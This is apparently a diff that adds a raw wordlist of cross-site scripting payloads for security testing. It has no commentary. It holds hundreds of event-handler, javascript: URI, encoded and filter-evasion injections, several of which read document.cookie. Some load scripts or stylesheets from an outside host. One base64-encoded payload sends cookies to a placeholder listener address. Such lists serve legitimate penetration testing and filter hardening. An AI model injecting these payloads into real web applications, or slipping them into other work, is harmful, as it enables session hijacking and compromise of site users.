@@ -1,0 +1,223 @@
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>|javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+prompt(42);//'>|javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+confirm(42);//'>
+<a onmouseover="alert(document.cookie)">xxs link</a>|<a onmouseover="prompt(document.cookie)">xxs link</a>|<a onmouseover="confirm(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>|<a onmouseover=prompt(document.cookie)>xxs link</a>|<a onmouseover=confirm(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">|<IMG """><SCRIPT>prompt("XSS")</SCRIPT>">|<IMG """><SCRIPT>confirm("XSS")</SCRIPT>">
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>|<a href="javascript:prompt(String.fromCharCode(88,83,83))">Click Me!</a>|<a href="javascript:confirm(String.fromCharCode(88,83,83))">Click Me!</a>
+<IMG SRC=# onmouseover="alert('xxs')">|<IMG SRC=# onmouseover="prompt('xxs')">|<IMG SRC=# onmouseover="confirm('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">|<IMG SRC= onmouseover="prompt('xxs')">|<IMG SRC= onmouseover="confirm('xxs')">
+<IMG onmouseover="alert('xxs')">|<IMG onmouseover="prompt('xxs')">|<IMG onmouseover="confirm('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>|<IMG SRC=/ onerror="prompt(String.fromCharCode(88,83,83))"></img>|<IMG SRC=/ onerror="confirm(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">|<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000112&#0000114&#0000111&#0000109&#0000112&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">|<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000099&#0000111&#0000110&#0000102&#0000105&#0000114&#0000109&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>|<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>|<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>|<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x70&#x72&#x6F&#x6D&#x70&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>|<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x63&#x6F&#x6E&#x66&#x69&#x72&#x6D&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+<a href="jav   ascript:alert('XSS');">Click Me</a>|<a href="jav   ascript:prompt('XSS');">Click Me</a>|<a href="jav   ascript:confirm('XSS');">Click Me</a>
+<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>|<a href="jav&#x09;ascript:prompt('XSS');">Click Me</a>|<a href="jav&#x09;ascript:confirm('XSS');">Click Me</a>
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>|<a href="jav&#x0A;ascript:prompt('XSS');">Click Me</a>|<a href="jav&#x0A;ascript:confirm('XSS');">Click Me</a>
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>|<a href="jav&#x0D;ascript:prompt('XSS');">Click Me</a>|<a href="jav&#x0D;ascript:confirm('XSS');">Click Me</a>
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>|<a href=" &#14;  javascript:prompt('XSS');">Click Me</a>|<a href=" &#14;  javascript:confirm('XSS');">Click Me</a>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>|<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=prompt("XSS")>|<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm("XSS")>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>|<<SCRIPT>prompt("XSS");//\<</SCRIPT>|<<SCRIPT>confirm("XSS");//\<</SCRIPT>
+<IMG SRC="`<javascript:alert>`('XSS')"|<IMG SRC="`<javascript:prompt>`('XSS')"|<IMG SRC="`<javascript:confirm>`('XSS')"
+\";alert('XSS');//|\";prompt('XSS');//|\";confirm('XSS');//
+</script><script>alert('XSS');</script>|</script><script>prompt('XSS');</script>|</script><script>confirm('XSS');</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>|</TITLE><SCRIPT>prompt("XSS");</SCRIPT>|</TITLE><SCRIPT>confirm("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">|<INPUT TYPE="IMAGE" SRC="javascript:prompt('XSS');">|<INPUT TYPE="IMAGE" SRC="javascript:confirm('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">|<BODY BACKGROUND="javascript:prompt('XSS')">|<BODY BACKGROUND="javascript:confirm('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">|<IMG DYNSRC="javascript:prompt('XSS')">|<IMG DYNSRC="javascript:confirm('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">|<IMG LOWSRC="javascript:prompt('XSS')">|<IMG LOWSRC="javascript:confirm('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>|<STYLE>li {list-style-image: url("javascript:prompt('XSS')");}</STYLE><UL><LI>XSS</br>|<STYLE>li {list-style-image: url("javascript:confirm('XSS')");}</STYLE><UL><LI>XSS</br>
+<svg/onload=alert('XSS')>|<svg/onload=prompt('XSS')>|<svg/onload=confirm('XSS')>
+Set.constructor`alert\x28document.domain\x29`|Set.constructor`prompt\x28document.domain\x29`|Set.constructor`confirm\x28document.domain\x29`
+<BODY ONLOAD=alert('XSS')>|<BODY ONLOAD=prompt('XSS')>|<BODY ONLOAD=confirm('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">|<BGSOUND SRC="javascript:prompt('XSS');">|<BGSOUND SRC="javascript:confirm('XSS');">
+<BR SIZE="&{alert('XSS')}">|<BR SIZE="&{prompt('XSS')}">|<BR SIZE="&{confirm('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">|<LINK REL="stylesheet" HREF="javascript:prompt('XSS');">|<LINK REL="stylesheet" HREF="javascript:confirm('XSS');">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>|<STYLE>@im\port'\ja\vasc\ript:prompt("XSS")';</STYLE>|<STYLE>@im\port'\ja\vasc\ript:confirm("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">|<IMG STYLE="xss:expr/*XSS*/ession(prompt('XSS'))">|<IMG STYLE="xss:expr/*XSS*/ession(confirm('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">|<XSS STYLE="xss:expression(prompt('XSS'))">|<XSS STYLE="xss:expression(confirm('XSS'))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>|<STYLE>.XSS{background-image:url("javascript:prompt('XSS')");}</STYLE><A CLASS=XSS></A>|<STYLE>.XSS{background-image:url("javascript:confirm('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>|<STYLE type="text/css">BODY{background:url("javascript:prompt('XSS')")}</STYLE>|<STYLE type="text/css">BODY{background:url("javascript:confirm('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>|<STYLE type="text/css">BODY{background:url("<javascript:prompt>('XSS')")}</STYLE>|<STYLE type="text/css">BODY{background:url("<javascript:confirm>('XSS')")}</STYLE>
+¼script¾alert(¢XSS¢)¼/script¾|¼script¾prompt(¢XSS¢)¼/script¾|¼script¾confirm(¢XSS¢)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">|<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:prompt('XSS');">|<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">|<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:prompt('XSS');">|<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm('XSS');">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">|<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>prompt('XSS')</SCRIPT>">|<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>confirm('XSS')</SCRIPT>">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>|<IFRAME SRC="javascript:prompt('XSS');"></IFRAME>|<IFRAME SRC="javascript:confirm('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>|<IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>|<IFRAME SRC=# onmouseover="confirm(document.cookie)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>|<FRAMESET><FRAME SRC="javascript:prompt('XSS');"></FRAMESET>|<FRAMESET><FRAME SRC="javascript:confirm('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">|<TABLE BACKGROUND="javascript:prompt('XSS')">|<TABLE BACKGROUND="javascript:confirm('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">|<TABLE><TD BACKGROUND="javascript:prompt('XSS')">|<TABLE><TD BACKGROUND="javascript:confirm('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">|<DIV STYLE="background-image: url(javascript:prompt('XSS'))">|<DIV STYLE="background-image: url(javascript:confirm('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">|<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0160\0162\0157\0155\0160\0074\0028.1027\0058.1053\0053\0027\0029'\0029">|<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0143\0157\0156\0146\0151\0162\0155\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url( javascript:alert('XSS'))">|<DIV STYLE="background-image: url( javascript:prompt('XSS'))">|<DIV STYLE="background-image: url( javascript:confirm('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">|<DIV STYLE="width: expression(prompt('XSS'));">|<DIV STYLE="width: expression(confirm('XSS'));">
+<BASE HREF="javascript:alert('XSS');//">|<BASE HREF="javascript:prompt('XSS');//">|<BASE HREF="javascript:confirm('XSS');//">
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>|<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:prompt('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>|<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:confirm('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">|<Img src = x onerror = "javascript: window.onerror = prompt; throw XSS">|<Img src = x onerror = "javascript: window.onerror = confirm; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">|<Video> <source onerror = "javascript: prompt (XSS)">|<Video> <source onerror = "javascript: confirm (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:alert(document.cookie);">|<applet code="javascript:prompt(document.cookie);">|<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">|<isindex x="javascript:" onmouseover="prompt(XSS)">|<isindex x="javascript:" onmouseover="confirm(XSS)">
+"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>|"></SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>|"></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">|"><img src="x:x" onerror="prompt(XSS)">|"><img src="x:x" onerror="confirm(XSS)">
+"><iframe src="javascript:alert(XSS)">|"><iframe src="javascript:prompt(XSS)">|"><iframe src="javascript:confirm(XSS)">
+<object data="javascript:alert(XSS)">|<object data="javascript:prompt(XSS)">|<object data="javascript:confirm(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>|<isindex type=image src=1 onerror=prompt(XSS)>|<isindex type=image src=1 onerror=confirm(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>|<img src=x:prompt(alt) onerror=eval(src) alt=0>|<img src=x:confirm(alt) onerror=eval(src) alt=0>
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>|<img src="x:gif" onerror="window['pr\u006fmpt'](0)"></img>|<img src="x:gif" onerror="window['c\u006fnfirm'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">|<iframe/src="data:text/html,<svg onload=prompt(1)>">|<iframe/src="data:text/html,<svg onload=confirm(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>|<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; prompt(1)" http-equiv="refresh"/>|<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; confirm(1)" http-equiv="refresh"/>
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x00script>javascript:alert(1)</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+<img SRC="javascript:document.vulnerable=true;"
+<iframe src="javascript:document.vulnerable=true; <
+<script>a=/XSS/\ndocument.vulnerable=true;</script>
+\";document.vulnerable=true;;//
+</title><SCRIPT>document.vulnerable=true;</script>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+<img DYNSRC="javascript:document.vulnerable=true;">
+<img LOWSRC="javascript:document.vulnerable=true;">
+<bgsound SRC="javascript:document.vulnerable=true;">
+<br SIZE="&{document.vulnerable=true}">
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+<img SRC='vbscript:document.vulnerable=true;'>
+1script3document.vulnerable=true;1/script3
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+ <a href="jav   ascript:alert('XSS');">Click Me</a>
+ <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT SRC=//xss.rocks/.j>
+<IMG SRC="`<javascript:alert>`('XSS')"
+\";alert('XSS');//
+</script><script>alert('XSS');</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<svg/onload=alert('XSS')>
+Set.constructor`alert\x28document.domain\x29
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+/?xss=500); alert(document.cookie);//
+/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(1)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/xss/))}//<style></style>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
